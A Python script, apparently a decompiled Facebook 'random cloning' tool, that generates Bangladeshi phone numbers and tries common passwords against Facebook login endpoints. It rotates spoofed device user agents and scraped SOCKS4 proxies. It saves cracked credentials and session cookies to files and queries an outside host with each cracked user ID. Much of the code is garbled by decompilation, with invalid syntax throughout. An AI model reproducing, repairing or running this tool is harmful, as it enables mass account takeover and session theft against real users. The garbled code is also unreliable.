import requests
import bs4
import json
import uuid
import os
import sys
import random
import datetime
import time
import re
import urllib3
import base64
import string
import platform
import marshal
import base64
import zlib
import urllib
import subprocess
from datetime import datetime
import string
from concurrent.futures import ThreadPoolExecutor as tred
prox = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
open('Proksi.txt', 'w').write(prox)
green = '\x1b[1;32m'
white = '\x1b[1;37m'
ping = '\x1b[38;5;208m'
yellow = '\x1b[38;5;226m'
red = '\x1b[38;5;196m'
xd = f''' {red}[{white}={red}]{green}'''
xd1 = f''' {red}[{white}1{red}]{green}'''
xd2 = f''' {red}[{white}2{red}]{green}'''
xd3 = f''' {red}[{white}3{red}]{green}'''
xd0 = f''' {red}[{white}0{red}]{green}'''
xdx = f''' {red}[{white}?{red}]{green}'''
xdxx = f'''{red}:{green}'''
user = []
ok = []
cp = []
cpx = []
plist = []
loop = 0
ugen = []

def dalvik_uaa_bd_large():
    densities = [
        '{density=3.0,width=1080,height=2401}',
        '{density=3.0,width=1080,height=2161}',
        '{density=1.5,width=1280,height=720}',
        '{density=2.0,width=720,height=1344}',
        '{density=1.75,width=720,height=1488}',
        '{density=1.0,width=1066,height=552}',
        '{density=2.0,width=480,height=854}',
        '{density=1.5,width=1200,height=1848}',
        '{density=1.3312501,width=1280,height=736}',
        '{density=3.0,width=1080,height=2208}',
        '{density=4.0,width=1440,height=2392}',
        '{density=1.0,width=320,height=480}',
        '{density=3.0,width=1080,height=1920}',
        '{density=1.46875,width=720,height=1510}',
        '{density=2.625,width=1080,height=2034}',
        '{density=1.5,width=1200,height=1920}',
        '{density=2.0,width=720,height=1280}',
        '{density=2.0,width=720,height=1448}',
        '{density=1.275,width=540,height=1071}',
        '{density=3.5,width=1440,height=3120}']
    models = [
        'CPH2071',
        'CPH2083',
        'CPH2185',
        'CPH2269',
        'CPH2349',
        'RMX5303',
        'RMX3636',
        'SM-A528B',
        'Infinix X665C',
        'Pixel 7',
        'Moto G31',
        'Galaxy S20',
        'OnePlus 9',
        'Galaxy Note20',
        'Galaxy S21',
        'Vivo V21',
        'Xiaomi Mi 11',
        'Redmi Note 11',
        'Realme 9',
        'Galaxy A52',
        'Galaxy A71',
        'Galaxy S10',
        'Galaxy M31',
        'Poco X3',
        'Poco F3',
        'LG G8',
        'Sony Xperia 10',
        'Huawei P40',
        'Huawei Mate 30',
        'Nokia 5.4',
        'Nokia 7.2',
        'Samsung Tab S6',
        'iPhone13,4',
        'iPhone14,2',
        'iPad8,1',
        'iPad Air 4',
        'OnePlus 8T',
        'OnePlus 10',
        'Oppo Reno6',
        'Vivo Y73',
        'Realme 8',
        'Realme GT',
        'Xiaomi Mi 10',
        'Redmi 10',
        'Samsung S22',
        'Samsung A32',
        'Pixel 6',
        'Pixel 6a',
        'Pixel 5',
        'Galaxy Z Fold3',
        'Galaxy Z Flip3',
        'Galaxy A12',
        'Galaxy A31',
        'Galaxy A50',
        'Galaxy A70',
        'Galaxy M21',
        'Galaxy M51',
        'Vivo V20',
        'Vivo V23',
        'Vivo Y21',
        'Vivo Y33',
        'Vivo Y35',
        'Vivo X60',
        'Oppo A54',
        'Oppo A74',
        'Oppo F19',
        'Oppo F17',
        'Realme C25',
        'Realme C21',
        'Realme Narzo 50',
        'Realme Narzo 30',
        'Xiaomi Redmi 9',
        'Xiaomi Redmi 9A',
        'Xiaomi Redmi 10C',
        'Xiaomi Poco M4',
        'Xiaomi Poco X4',
        'Moto G Power',
        'Moto G Stylus',
        'Moto Edge 20',
        'Motorola Edge 30',
        'LG Velvet',
        'LG Wing',
        'Sony Xperia 1 II',
        'Sony Xperia 5 II',
        'Nokia 3.4',
        'Nokia 8.3',
        'Huawei P30',
        'Huawei Mate 20',
        'OnePlus Nord',
        'OnePlus Nord 2',
        'Samsung Galaxy F12',
        'Samsung Galaxy F22',
        'Samsung Galaxy F41',
        'Samsung Galaxy F62',
        'iPhone 12',
        'iPhone 12 Pro',
        'iPhone 12 Mini',
        'iPhone 13',
        'iPhone 13 Mini',
        'iPhone 13 Pro',
        'iPhone 13 Pro Max',
        'iPad Mini 6',
        'iPad Pro 11']
    brands = [
        'OPPO',
        'Samsung',
        'Infinix',
        'Motorola',
        'Pixel',
        'OnePlus',
        'Vivo',
        'Xiaomi',
        'Realme',
        'Redmi',
        'Sony',
        'Huawei',
        'Nokia',
        'LG',
        'Poco',
        'Apple',
        'iPad',
        'Google',
        'Blackberry',
        'Asus']
    os_versions = [
        '9',
        '10',
        '11',
        '12',
        '13',
        '14',
        '15',
        '16']
    bd_carriers = [
        'Grameenphone',
        'Robi',
        'Banglalink',
        'Airtel',
        'Teletalk',
        'Citycell',
        'SkyPhone']
    ua_list = []
    for _ in range(30):
        density = random.choice(densities)
        model = random.choice(models)
        brand = random.choice(brands)
        mobile_version = random.choice(os_versions)
        fbcr = random.choice(bd_carriers)
        ua = f'''Dalvik/2.1.0 (Linux; U; Android {mobile_version}; {model} Build/UP1A.231005.007) [FBAN/FB4A;FBAV/{random.randint(450, 530)}.0.0.{random.randint(10, 99)}.{random.randint(10, 99)};FBBV/{random.randint(460000000, 530000000)};FBDM={density};FBLC=en_GB;FBRV/{random.randint(300000000, 400000000)};FBCR/{fbcr};FBMF/{brand};FBBD/{brand};FBPN/com.facebook.katana;FBDV/{model};FBSV/{mobile_version};FBOP/1;FBCA/arm64-v8a:;]'''
        ua_list.append(ua)
        return random.choice(ua_list)


def JAHID_M1():
    ua = '[FBAN/FB4A;FBAV/' + str(random.randint(11, 77)) + '.0.0.' + str(random.randrange(9, 49)) + str(random.randint(11, 77)) + ';FBBV/' + str(random.randint(1111111, 7777777)) + ';FBLC/en_US;FBCR/Grameenphone;FBMF/OnePlus;FBBD/oneplus;FBPN/com.facebook.katana;FBDV/One;FBSV/11;FBCA/armeabi-v7a:armeabi;]'
    return ua


def JAHID_M2():
    ua = '[FBAN/FB4A;FBAV/' + str(random.randint(100, 599)) + '.0.0.' + str(random.randint(10, 90)) + ';FBBV/' + str(random.randint(200000000, 900000000)) + ';FBLC/en_GB;FBCR/Robi;FBMF/Samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-' + str(random.choice([
        'A105F',
        'M205F',
        'J600F',
        'A307FN'])) + ';FBSV/' + str(random.randint(7, 13)) + ';FBCA/arm64-v8a;]'
    return ua


def JAHID_M3():
    ua = '[FBAN/FB4A;FBAV/' + str(random.randint(200, 600)) + '.0.0.' + str(random.randint(10, 120)) + ';FBBV/' + str(random.randint(300000000, 999999999)) + ';FBLC/en_US;FBCR/Banglalink;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi ' + str(random.choice([
        'Note 7',
        'Note 8',
        'Note 9',
        '9A',
        '10C'])) + ';FBSV/' + str(random.randint(8, 14)) + ';FBCA/arm64-v8a;]'
    return ua


def JAHID_M4():
    ua = '[FBAN/FB4A;FBAV/' + str(random.randint(300, 700)) + '.0.0.' + str(random.randint(20, 140)) + ';FBBV/' + str(random.randint(111111111, 999999999)) + ';FBLC/en_US;FBCR/Airtel;FBMF/Vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/Vivo ' + str(random.choice([
        'Y91C',
        'Y20',
        'Y21',
        'Y33s'])) + ';FBSV/' + str(random.randint(8, 13)) + ';FBCA/arm64-v8a;]'
    return ua


def JAHID_M5():
    ua = '[FBAN/FB4A;FBAV/' + str(random.randint(150, 750)) + '.0.0.' + str(random.randint(10, 160)) + ';FBBV/' + str(random.randint(11111111, 99999999)) + ';FBLC/en_US;FBCR/Grameenphone;FBMF/Oppo;FBBD/oppo;FBPN/com.facebook.katana;FBDV/CPH' + str(random.randint(1900, 2200)) + ';FBSV/' + str(random.randint(7, 12)) + ';FBCA/arm64-v8a;]'
    return ua


def JAHID_M6():
    ua = '[FBAN/FB4A;FBAV/' + str(random.randint(200, 800)) + '.0.0.' + str(random.randint(15, 180)) + ';FBBV/' + str(random.randint(111111111, 999999999)) + ';FBLC/en_US;FBCR/Teletalk;FBMF/Realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/Realme ' + str(random.choice([
        'C11',
        'C12',
        'C15',
        '8i',
        'Narzo 50'])) + ';FBSV/' + str(random.randint(8, 14)) + ';FBCA/arm64-v8a;]'
    return ua


def JAHID_M7():
    ua = '[FBAN/FB4A;FBAV/' + str(random.randint(300, 900)) + '.0.0.' + str(random.randint(10, 99)) + ';FBBV/' + str(random.randint(222222222, 888888888)) + ';FBLC/en_US;FBCR/Grameenphone;FBMF/Huawei;FBBD/huawei;FBPN/com.facebook.katana;FBDV/' + str(random.choice([
        'P30 lite',
        'Nova 7i',
        'Y9 Prime',
        'Mate 20 Pro'])) + ';FBSV/' + str(random.randint(7, 12)) + ';FBCA/arm64-v8a;]'
    return ua


def JAHID_M8():
    ua = '[FBAN/FB4A;FBAV/' + str(random.randint(250, 850)) + '.0.0.' + str(random.randint(10, 99)) + ';FBBV/' + str(random.randint(333333333, 999999999)) + ';FBLC/en_US;FBCR/Banglalink;FBMF/Infinix;FBBD/infinix;FBPN/com.facebook.katana;FBDV/Infinix ' + str(random.choice([
        'Hot 9',
        'Hot 10',
        'Note 7',
        'Note 10',
        'Zero 8'])) + ';FBSV/' + str(random.randint(8, 13)) + ';FBCA/arm64-v8a;]'
    return ua


def JAHID_M9():
    ua = '[FBAN/FB4A;FBAV/' + str(random.randint(100, 500)) + '.0.0.' + str(random.randint(10, 120)) + ';FBBV/' + str(random.randint(123456789, 987654321)) + ';FBLC/en_US;FBCR/Grameenphone;FBMF/Motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/Moto ' + str(random.choice([
        'G7',
        'G8',
        'G9',
        'E6',
        'E7 Plus'])) + ';FBSV/' + str(random.randint(7, 13)) + ';FBCA/arm64-v8a;]'
    return ua


def JAHID_M10():
    ua = '[FBAN/FB4A;FBAV/' + str(random.randint(200, 650)) + '.0.0.' + str(random.randint(20, 130)) + ';FBBV/' + str(random.randint(444444444, 999999999)) + ';FBLC/en_US;FBCR/Robi;FBMF/Nokia;FBBD/nokia;FBPN/com.facebook.katana;FBDV/Nokia ' + str(random.choice([
        '5.3',
        '6.1 Plus',
        '7.2',
        '8.1'])) + ';FBSV/' + str(random.randint(7, 13)) + ';FBCA/arm64-v8a;]'
    return ua


def mozilauaaa():
    ua1 = 'Mozilla/5.0 (Linux; Android 15; RMX5303 Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.68 Mobile Safari/537.36'
    ua2 = 'Mozilla/5.0 (Linux; Android 14; RMX3636 Build/UKQ1.230924.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/128.0.6613.95 Mobile Safari/537.36'
    mix_uaa = random.choice([
        ua1,
        ua2])
    return mix_uaa


def mixed_browser_ua():
    ua_list = [
        'Mozilla/5.0 (Linux; Android 15; RMX5303 Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.68 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 14; RMX3636 Build/UKQ1.230924.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/128.0.6613.95 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 13; SM-A528B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.171 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 12; Infinix X665C Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.138 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 13; OPPO CPH2083 Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.5845.96 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 14; Pixel 7 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.5938.92 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 12; Redmi Note 11 Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.171 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 15; RMX3562 Build/AP3A.240905.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.68 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 14; SM-M136B Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/130.0.7072.69 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 13; Infinix X6815 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.127 Mobile Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36',
        'Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:116.0) Gecko/20100101 Firefox/116.0',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/116.0.1938.76',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0',
        'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.92 Safari/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (iPad; CPU OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/16A366 Safari/604.1']
    return random.choice(ua_list)

sys.stdout.write('\x1b]2; [MR PAPI] \x07')

def clear():
    os.system('clear')
    print(logo)


def linex():
    print(f'''{white}{'--------------------------------------------------'}''')

logo = f''' \n        {green}  ▖  ▖▄▖  ▄▖▄▖▄▖▄▖🍁 {red}•{green} OWNER {xdxx} MR PAPI\n        {ping}  ▛▖▞▌▙▘▄▖▙▌▌▌▙▌▐ 🍁 {red}•{green} TOOLS {xdxx} RANDOM CLONING\n        {green}  ▌▝ ▌▌▌  ▌ ▛▌▌ ▟▖🍁 {red}•{green} VERSION {xdxx} 0.1\n{white}{'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'}'''

def PAPI_menu():
    clear()
    print(f'''{xd1} BANGLADESH RANDOM CLONING ''')
    print(f'''{xd0} EXIT RANDOM CLONING ''')
    linex()
    option = input(f'''{xdx} INPUT OPTION {xdxx} ''')
    if option == '1':
        bdcloning()
        return None
    if option == '0':
        exit()
        return None
    exit(f'''{xd} OPTION NOT FOUND ''')
    time.sleep(2)
    PAPI_menu()


def bdcloning():
    clear()
    print(f'''{xd} EXAMPLE {xdxx} 016 {red}|{green} 017 {red}|{green} 018 {red}|{green} 019 ''')
    linex()
    code = input(f'''{xdx} INPUT CODE {xdxx} ''')
    linex()
    print(f'''{xd} EXAMPLE {xdxx} 3000 {red}|{green} 5000 {red}|{green} 10000 {red}|{green} 99999 ''')
    linex()
    limit = int(input(f'''{xdx} INPUT LIMIT {xdxx} '''))
    clear()
    print(f'''{xd1} METHOD M1 {red}[{white}GRAPH{red}]{green} ''')
    print(f'''{xd2} METHOD M2 {red}[{white}B-GRAPH{red}]{green} ''')
    print(f'''{xd3} METHOD M3 {red}[{white}HOST{red}]{green} ''')
    linex()
    methd = input(f'''{xdx} INPUT METHOD {xdxx} ''')
    clear()
    print(f'''{yellow}            DO YOU WENT SHOW CP ID ''')
    linex()
    oposs = input(f'''{xdx} INPUT {red}[{white}y{red}|{white}n{red}] {xdxx} ''')
    if oposs in ('y', 'Y', 'yes', 'Yes', '1'):
        cpx.append('y')
    cpx.append('n')
    for pronhub in range(limit):
        oxoxo = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(oxoxo)
        crack_zone = tred(max_workers = 30)
        clear()
        tl = str(len(user))
        print(f'''{xd} OPERATOR{red}|{green}LIMIT{red}|{green}METHOD {xdxx}{white} {code}{red}|{white}{tl}{red}|{white}M{methd}''')
        print(f'''{xd} IF NO RESULT {red}[{white}ON{red}|{white}OFF{red}]{green} AIRPLANE MODE ''')
        linex()
        for love in user:
            ids = code + love
            pasx = [
                None,
                ids,
                4,
                None,
                ids,
                2,
                None,
                'mimmim',
                'jannat',
                'sadiya',
                '00998877',
                '203040',
                '304050',
                '506070',
                '708090',
                '607080',
                '908070',
                '@@@###',
                '@1234567@',
                '@123456@',
                '@1234@',
                '@12345@',
                '09876543',
                '77889900',
                '999888',
                '112255',
                '112200',
                '113355']
            if methd == '1':
                crack_zone.submit(rndmone, ids, pasx, tl)
            if methd == '2':
                crack_zone.submit(rndmtwo, ids, pasx, tl)
            if methd == '3':
                crack_zone.submit(rndmthree, ids, pasx, tl)
            crack_zone.submit(rndmone, ids, pasx, tl)
            None(None, None)
            print(f'''\r\r{white}{'--------------------------------------------------'}''')
            print(f'''{xd} THE PROCESS HAS COMPLETED''')
            print(f'''{xd} TOTAL OK{red}|{green}CP IDS :{white} ''' + str(len(ok)) + '|' + str(len(cp)))
            print(f'''\r\r{white}{'--------------------------------------------------'}''')
            exit()
            return None
            if not 3:
                pass
    ids
    5


def rndmone(ids, pasx, tl):
    global loop
    sys.stdout.write(f'''\r[PAPI-XD]-[{loop}]-[OK:{len(ok)}]-[CP:{len(cp)}] ''')
    sys.stdout.flush()
    for pas in pasx:
        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
        data = {
            'locale': 'en_GB',
            'client_country_code': 'GB',
            'fb_api_req_friendly_name': 'authenticate',
            'api_key': '62f8ce9f74b12f84c123cc23437a4a32',
            'access_token': accees_token,
            'FBAV': f'''{random.randint(450, 550)}.0.0.{random.randint(10, 99)}.{random.randint(10, 99)}''',
            'FBBV': str(random.randint(460000000, 530000000)),
            'FBDV': random.choice([
                'RMX5303',
                'Pixel 7',
                'SM-A528B',
                'Infinix X665C',
                'OPPO CPH2083',
                'iPhone13,4',
                'iPad8,1']),
            'FBDM': f'''{{density={round(random.uniform(1, 4), 2)},width={random.choice([
                320,
                480,
                720,
                1080,
                1280,
                1440])},height={random.choice([
                480,
                854,
                1280,
                1920,
                2208,
                2392])}}}''' }
        headers = {
            'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32' }
        url = 'https://graph.facebook.com/auth/login'
        po = requests.post(url, data = data, headers = headers).json()
        if 'session_key' in po:
            uid = po['uid']
            cookies = (lambda .0: for i in .0:)
i['name'] + '=' + i['value']None)(po['session_cookies']())
            print(f'''\r[PAPI-OK] {str(uid)} | {pas} | Cookies: {cookies}''')
            open('/sdcard/MR-PAPI-RNDM-M1-OK-IDS.txt', 'a').write(f'''{uid}|{pas}|{cookies}\n''')
            ok.append(str(uid))
            ';'.join
        if 'www.facebook.com' in po.get('error', { }).get('message', ''):
            uid = po['error']['error_data']['uid']
            print(f'''\r[PAPI-CP] {str(uid)} | {pas}''')
            open('/sdcard/MR-PAPI-RNDM-M1-CP-IDS.txt', 'a').write(f'''{uid}|{pas}\n''')
            cp.append(str(uid))
    loop += 1
    return None
    'True'


def rndmtwo(ids, pasx, tl):
    global loop
    []['\r'][f'''{xd}'''][f'''{white}''']['-'][f'''{red}''']['['][f'''{green}''']['PAPI-XD'][f'''{red}'''][']'][f'''{white}''']['-'][f'''{red}''']['['][f'''{white}'''][f'''{loop}'''][f'''{red}'''][']'][f'''{white}''']['-'][f'''{red}''']['['][f'''{green}'''][f'''{len(ok)}'''][f'''{red}'''][']'][f'''{white}''']['-'][f'''{red}''']['['][f'''{ping}'''][f'''{len(cp)}''']([]['\r'][f'''{xd}'''][f'''{white}''']['-'][f'''{red}''']['['][f'''{green}''']['PAPI-XD'][f'''{red}'''][']'][f'''{white}''']['-'][f'''{red}''']['['][f'''{white}'''][f'''{loop}'''][f'''{red}'''][']'][f'''{white}''']['-'][f'''{red}''']['['][f'''{green}'''][f'''{len(ok)}'''][f'''{red}'''][']'][f'''{white}''']['-'][f'''{red}''']['['][f'''{ping}'''][f'''{len(cp)}'''][f'''{red}''']([]['\r'][f'''{xd}'''][f'''{white}''']['-'][f'''{red}''']['['][f'''{green}''']['PAPI-XD'][f'''{red}'''][']'][f'''{white}''']['-'][f'''{red}''']['['][f'''{white}'''][f'''{loop}'''][f'''{red}'''][']'][f'''{white}''']['-'][f'''{red}''']['['][f'''{green}'''][f'''{len(ok)}'''][f'''{red}'''][']'][f'''{white}''']['-'][f'''{red}''']['['][f'''{ping}'''][f'''{len(cp)}'''][f'''{red}''']['] ']))
    sys.stdout.flush()
    for pas in pasx:
        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
        random_seed = random.Random()
        data = {
            'locale': 'en_GB',
            'client_country_code': 'GB',
            'fb_api_req_friendly_name': 'authenticate',
            'api_key': '62f8ce9f74b12f84c123cc23437a4a32',
            'access_token': accees_token }
        headers = {
            'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32' }
        url = 'https://graph.facebook.com/auth/login'
        po = requests.post(url, data = data, headers = headers).json()
        if 'session_key' in po:
            uid = po['uid']
            cookies = (lambda .0: for i in .0:
i['name'] + '=' + i['value']None)(po['session_cookies']())
            lkremoveurl = str(requests.get(f'''https://mrPAPI.pythonanywhere.com/live?uid={str(uid)}''').text)
            if 'LIVE' in lkremoveurl:
                print(f'''\r{xd}{white}-{red}[{green}PAPI-OK{red}]{green} {str(uid)} | {pas} ''')
                print(f'''\r{xd}{white}-{red}[🍪{red}]{white} {cookies} ''')
                print('')
                open('/sdcard/MR-PAPI-RNDM-M1-OK-IDS.txt', 'a').write(str(uid) + '|' + pas + '|' + cookies + '\n')
                ok.append(str(uid))
                ';'.join
        if 'www.facebook.com' in po['error']['message']:
            uid = po['error']['error_data']['uid']
            if 'y' in cpx:
                print(f'''\r{xd}{white}-{red}[{ping}PAPI-CP{red}]{ping} {str(uid)} | {pas} ''')
            open('/sdcard/MR-PAPI-RNDM-M1-CP-IDS.txt', 'a').write(str(uid) + '|' + pas + '\n')
            cp.append(str(uid))
    loop += 1
    return None
    'True'


def rndmthree(ids, pasx, tl):
    global loop
    []['\r'][f'''{xd}'''][f'''{white}''']['-'][f'''{red}''']['['][f'''{green}''']['PAPI-XD'][f'''{red}'''][']'][f'''{white}''']['-'][f'''{red}''']['['][f'''{white}'''][f'''{loop}'''][f'''{red}'''][']'][f'''{white}''']['-'][f'''{red}''']['['][f'''{green}'''][f'''{len(ok)}'''][f'''{red}'''][']'][f'''{white}''']['-'][f'''{red}''']['['][f'''{ping}'''][f'''{len(cp)}''']([]['\r'][f'''{xd}'''][f'''{white}''']['-'][f'''{red}''']['['][f'''{green}''']['PAPI-XD'][f'''{red}'''][']'][f'''{white}''']['-'][f'''{red}''']['['][f'''{white}'''][f'''{loop}'''][f'''{red}'''][']'][f'''{white}''']['-'][f'''{red}''']['['][f'''{green}'''][f'''{len(ok)}'''][f'''{red}'''][']'][f'''{white}''']['-'][f'''{red}''']['['][f'''{ping}'''][f'''{len(cp)}'''][f'''{red}''']([]['\r'][f'''{xd}'''][f'''{white}''']['-'][f'''{red}''']['['][f'''{green}''']['PAPI-XD'][f'''{red}'''][']'][f'''{white}''']['-'][f'''{red}''']['['][f'''{white}'''][f'''{loop}'''][f'''{red}'''][']'][f'''{white}''']['-'][f'''{red}''']['['][f'''{green}'''][f'''{len(ok)}'''][f'''{red}'''][']'][f'''{white}''']['-'][f'''{red}''']['['][f'''{ping}'''][f'''{len(cp)}'''][f'''{red}''']['] ']))
    sys.stdout.flush()
    ewe = requests.Session()
    ua = mixed_browser_ua()
    for pas in pasx:
        xxcc = open('Proksi.txt', 'r').read().splitlines()
        zzxx = {
            'http': 'socks4://' + random.choice(xxcc) }
        link = ewe.get('https://touch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8').text
        data = {
            'lsd': re.search('name="lsd" value="(.*?)"', str(link)).group(1) }
        headers = {
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://touch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' }
        response = ewe.post('https://touch.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100', data = data, headers = headers, allow_redirects = False, proxies = zzxx)
        if 'checkpoint' in ewe.cookies.get_dict():
            uid = ewe.cookies.get_dict()['checkpoint'].split('3A')[1].split('%')[0]
            if 'y' in cpx:
                print(f'''\r{xd}{white}-{red}[{ping}PAPI-CP{red}]{ping} {str(uid)} | {pas} ''')
            open('/sdcard/MR-PAPI-RNDM-M2-CP-IDS.txt', 'a').write(str(uid) + '|' + pas + '\n')
            cp.append(str(uid))
            'same-origin'
        if 'c_user' in ewe.cookies.get_dict():
            for key, value in []:
                value = ewe.cookies.get_dict().items()[f'''{key!s}={value!s}''']
                key = ewe.cookies.get_dict().items()
                cookies = None(';'.join)
                uid = re.findall('c_user=(.*);xs', cookies)[0]
                lkremoveurl = str(requests.get(f'''https://mrPAPI.pythonanywhere.com/live?uid={str(uid)}''').text)
                if 'LIVE' in lkremoveurl:
                    print(f'''\r{xd}{white}-{red}[{green}PAPI-OK{red}]{green} {str(uid)} | {pas} ''')
                    print(f'''\r{xd}{white}-{red}[🍪{red}]{white} {cookies} ''')
                    print('')
                    open('/sdcard/MR-PAPI-RNDM-M2-OK-IDS.txt', 'a').write(str(uid) + '|' + pas + '|' + cookies + '\n')
                    ok.append(str(uid))
                    'sec-fetch-site'
    loop += 1
    return None
    'https://touch.facebook.com'
    value = 'origin'
    key = '*/*'
    if requests.exceptions.ConnectionError:
        'accept'
        time.sleep(15)

if __name__ == '__main__':
    PAPI_menu()
    return None
return None
if Exception:
    e = None
    print(e)
    e = None
    del e
    e = None
    del e
